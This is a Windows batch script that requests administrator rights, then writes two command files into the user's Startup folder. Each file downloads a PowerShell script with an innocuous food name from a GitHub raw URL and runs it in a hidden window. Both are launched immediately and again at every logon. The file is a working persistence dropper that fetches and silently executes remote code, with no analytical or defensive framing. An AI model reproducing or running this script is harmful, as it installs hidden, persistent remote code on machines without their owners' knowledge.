@echo off

>nul 2>&1 "%SystemRoot%\system32\cacls.exe" "%SystemRoot%\system32\config\system"

if '%errorlevel%' NEQ '0' (
    echo Requesting administrative privileges...
    powershell -Command "Start-Process '%0' -Verb RunAs"
    exit
)

set "initialPath=%cd%"
set "startup=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

cd /d "%startup%"

REM Create and download the Pepsi script
echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pepsi.ps1' -OutFile 'pepsi.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\pepsi.ps1\"' -WindowStyle Hidden" > pepsi.cmd

REM Create and download the Pizza script
echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/lak200425/dododo/refs/heads/main/pizza.ps1' -OutFile 'pizza.ps1'; Start-Process powershell.exe -ArgumentList '-File \"%startup%\pizza.ps1\"' -WindowStyle Hidden" > pizza.cmd

REM Start both scripts in parallel using cmd.exe
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\pepsi.cmd\"' -WindowStyle Hidden"
powershell -Command "Start-Process cmd.exe -ArgumentList '/c \"%startup%\pizza.cmd\"' -WindowStyle Hidden"

cd /d "%initialPath%"

exit
